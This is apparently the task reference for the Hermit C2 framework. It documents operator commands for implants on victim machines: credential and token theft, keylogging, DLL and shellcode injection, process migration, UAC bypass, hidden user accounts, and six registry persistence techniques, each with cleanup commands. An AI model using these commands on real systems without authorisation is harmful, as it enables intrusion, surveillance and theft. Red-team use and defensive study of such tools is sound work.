# Task

After C2 agents connected to listeners, we can send various tasks in Agent Mode.  
Before sending tasks, we need to switch to [Agent Mode](./agent-mode.md) at first.

Currently, the following tasks are available:

```txt
TASK:
  assembly        Load and execute .NET assembly.
  cat             Read contents of a file.
  cd              Change the working directory.
  cmd             Execute arbitrary system command.
  connect         Change listener URL to connect.
  cp              Copy a file.
  creds steal     Steal credentials from various resources on the target computer
  dll             Load DLL and inject modules into the specified process.
  download        Download a file.
  env ls          List environment variables.
  envs            alias for 'env ls'
  find            Find files.
  group ls        List local groups.
  groups          Alias for 'group ls'.
  history         Retrieve information from history files of applications
  ip              Print the network interface information on target computer
  jitter          Set jitter time (seconds) between requests from beacon
  keylog          Keylogging N seconds.
  kill            Terminate the current process.
  killdate        Change killdate (UTC) for the implant beacon.
  ls              List files in a directory.
  migrate         Migrate the implant into another process.
  mkdir           Create a new directory.
  mv              Move a file to a destination location.
  net             Get TCP connections.
  pe              Load and execute PE (Portable Executable) file.
  persist         Establish persistence for implant.
  procdump        Dump process memory to a specified output file.
  ps kill         Terminate a process.
  ps ls           List processes.
  pwd             Print the current working directory.
  reg query       Enumerate subkeys for the specified path.
  rm              Remove file or directory.
  rportfwd add    Add settings to reverse port forwarding.
  rportfwd ls     List settings for reverse port forwarding.
  rportfwd rm     Stop and remove listener for reverse port forwarding.
  runas           Execute a program as another user.
  screenshot      Take a screenshot on target computer.
  shellcode       Inject shellcode into the specified process.
  sleep           Set sleep time (seconds) between requests from beacon.
  sysinfo         Regrieve system information of target computer.
  token revert    Revert back to the original process token.
  token steal     Steal token from the specified process and impersonate process.
  uac             Bypass UAC and start another session.
  upload          Upload a file to the target computer.
  user add        Add new user.
  user ls         List users.
  user rm         Delete user account.
  users           Alias for 'user ls'.
  whoami          Print the current user information.
```

Most task commands are similar to system commands.  
For each usage, run `help <command>` or `help <command> <subcommand>` on Agent mode.

## `cat`

Prints contents of a file.

```sh
Hermit [agent-abcd] > cat example.txt
```

## `cd`

Changes current working directory.  
Please note that if you want to use a backslash (`\`) in the desination path, you need to add another backslash (`\\`) as below:

```sh
Hermit [agent-abcd] > cd "C:\\Program Files\\"
```

Or you can use a normal slash (`/`) instead of a backslash:

```sh
Hermit [agent-abcd] > cd "C:/Program Files/"
```

## `cmd`

Executes an arbitrary system command.

```sh
Hermit [agent-abcd] > cmd "dir -Force"
```

## `connect`

Changes the connected listener URL to new one.   
This is used when we want to change to another listener for communication.

```sh
Hermit [agent-abcd] > connect https://172.12.34.56:12345
```

## `cp`

Copies a file to destination path on a victim machine.  
We can specify an absolute path or a relative path.

```sh
Hermit [agent-abcd] > cp /tmp/example.txt ./example.txt
```

## `dll`

Injects DLL into specified process.

```sh
# -p: target process ID
# -f: a DLL file path
Hermit [agent-abcd] > dll -p 1234 -f /path/to/example.dll
```

To see running processes and check PIDs, use `ps ls` task.  

## `download`

Downloads a file from victim machine.

```sh
Hermit [agent-abcd] > download C:/Users/John/Desktop/example.txt /tmp/example.txt
```

## `env`

### `env ls`, `envs`

Lists environment variables in victim machine.

## `find`

Find files or directories that contain the specified strings.

```sh
# -n: Specified strings
Hermit [agent-abcd] > find -n "creds.txt" ./
```

## `group`

### `group ls`, `groups`

Lists local groups in victim machine.

## `jitter`

Changes the Jitter time (N seconds).

```sh
Hermit [agent-abcd] > jitter 10
```

## `keylog`

Runs keylogger for N seconds.

```sh
# Keylogging for one minute.
Hermit [agent-abcd] > keylog 60
```

## `kill`

Terminates the implant process.  
**After running this task, the connection with the C2 agent will be terminated.**

## `killdate`

Changes the KillDate datetime.  
Specify in **UTC**. And the format is such like `2025-01-01 00:00:00`.

```sh
Hermit [agent-abcd] > killdate 2025-01-01 06:01:20
```

## `ls`

Lists files in current working directory in victim machine.

## `migrate`

Migrates the implant to another process.  
Specify the target process ID (PID).

```sh
Hermit [agent-abcd] > migrate 1234
```

To see running processes and PIDs, use `ps ls` task.

## `mkdir`

Creates a new directory in current working directory in victim machine.

```sh
Hermit [agent-abcd] > mkdir new_dir
```

## `mv`

Move a file to specified place.

```sh
Hermit [agent-abcd] > mv ./example.txt C:/Users/John/Documents/example.txt
```

## `net`

Prints open ip/ports.

## `pe`

Loads and executes a Portable Executable (`.exe`) file.

```sh
# -f: an executable file path
Hermit [agent-abcd] > pe -f /path/to/example.exe
```

## `persist`

Make the implant persistence.  

```sh
Hermit [agent-abcd] > persist
```

We can select the persistence technique in wizard.  

### Technique 1: `runkey`

Add an entry (the implant path) to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
The implant will run every time the victim machine starts.  

Cleanup:

```powershell title="Windows Victim Machine"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RandomName"
```

Replace the `RandomName` with the actual name which is randomly generated strings. To see the name, check with **Registry Editor (regedit)**.

### Technique 2: `user-init-mpr-logon-script`

Uses `UserInitMprLogonScript`.  
Add an entry (the imaplant path) to `HKCU\Environment`.  
The implant will run every time a user logs in.

Cleanup:

```powershell title="Windows Victim Machine"
Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"
```

### Technique 3: `screensaver`

Add an entry (the implant path) to `HKCU\Control Panel\Desktop`.  
The implant will run after a period of user inactivity.  

Cleanup:

```powershell title="Windows Victim Machine"
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
```

### Technique 4: `default-file-extension-hijacking`

Update an entry for `HKEY_CLASSES_ROOT\txtfile\shell\open\command`.  
Overwrite the default application when clicking a `.txt` file. It's required to **Administrator** privilege.  

Cleanup:

```powershell title="Windows Victim Machine"
reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\system32\NOTEPAD.EXE %1"
```

### Technique 5: `ifeo`

Uses **Image File Execution Options**.  
Write entries for `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe` and `HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe`.  
It's required to **Administrator** privilege.

Cleanup:

```powershell title="Windows Victim Machine"
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name 'GlobalFlag'
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Name 'ReportingMode'
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Name 'MonitorProcess'
```

### Technique 6: `winlogon`

Add an entry (the implant path) to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`.  
The implant will run every time a user logs on. It's required to **Administrator** privilege.  

Cleanup:

```powershell title="Windows Victim Machine"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe" /f
```

## `procdump`

Dump process memory and save it to dump file.  
Specify a target process ID (PID).

```sh
Hermit [agent-abcd] > procdump 1234
```

After dumping, the dump file is saved under `$HOME/.hermit/server/agents/agent-<name>/loot/procdumps` folder.  
To see running processes and PIDs, use `ps ls` task.

## `ps`

Manages processes.

### `ps kill`

Terminates a specified process.

```sh
Hermit [agent-abcd] > ps kill 1234
```

### `ps ls`

Lists all running processes.

## `pwd`

Prints the current working directory.

## `reg`

Manages registy keys.

### `reg query`

Retrieve registry values. For recursively, add `-r` flag.

```sh
Hermit [agent-abcd] > reg query "HKLM\\SOFTWARE\\Microsoft" -r
```

## `rm`

Removes file or directory.

```sh
Hermit [agent-abcd] > rm example.txt
```

To remove a directory recursively, add `-r` flag.

```sh
Hermit [agent-abcd] > rm -r example_dir
```

## `rportfwd`

Under development.

## `runas`

Runs a command as another user.

```sh
Hermit [agent-abcd] > runas -u Administrator -p 'Password123' notepad.exe
```

## `screenshot`

Takes a screenshot and save it as PNG file.

```sh
Hermit [agent-abcd] > screenshot
```

After successful, the captured image file is saved under `$HOME/.hermit/server/agents/agent-<name>/loot/screenshots` folder.

## `shellcode`

Injects shellcode to specified process.

```sh
# -p: target process ID
# -f: a shellcode file path
Hermit [agent-abcd] > shellcode -p 1234 -f /path/to/shellcode.bin
```

To see running processes and PIDs, use `ps ls` task.

## `sleep`

Changes the Sleep time (N seconds).

```sh
Hermit [agent-abcd] > sleep 10
```

## `sysinfo`

Retrieves the system information on a target machine.

```sh
Hermit [agent-abcd] > sysinfo
```

## `token`

Manages token.

### `token revert`

Reverts back to the original process token.

### `token steal`

Steal token from a specified process and impersonate.  
Please specify either `--process` or `--login` flag.

```sh
# --process: Execute process with stolen token.
Hermit [agent-abcd] > token steal --pid 1234 --process notepad.exe

# --login: Impersonate logged on.
Hermit [agent-abcd] > token steal --pid 1234 --login
```

## `upload`

Upload a file to victim machine.

```sh
Hermit [agent-abcd] > upload /tmp/example.txt C:/Users/John/Desktop/example.txt
```

## `user`

Manages users.

### `user add`

Add new user account.

```sh
Hermit [agent-abcd] > user add -u "John" -p "Password@123"
```

To hide a new user from `net user` command, add prefix `$` to the username as below:

```sh
Hermit [agent-abcd] > user add -u "John$" -p "Password@123"
```

### `user ls`, `users`

Lists local users.

### `user rm`

Delete a specified user.

```sh
Hermit [agent-abcd] > user rm -u "John"
```

## `whoami`

Prints current user information on victim machine.  

```sh
Hermit [agent-abcd] > whoami
```

To print the privileges, add `--priv` flag.

```sh
Hermit [agent-abcd] > whoami --priv
```
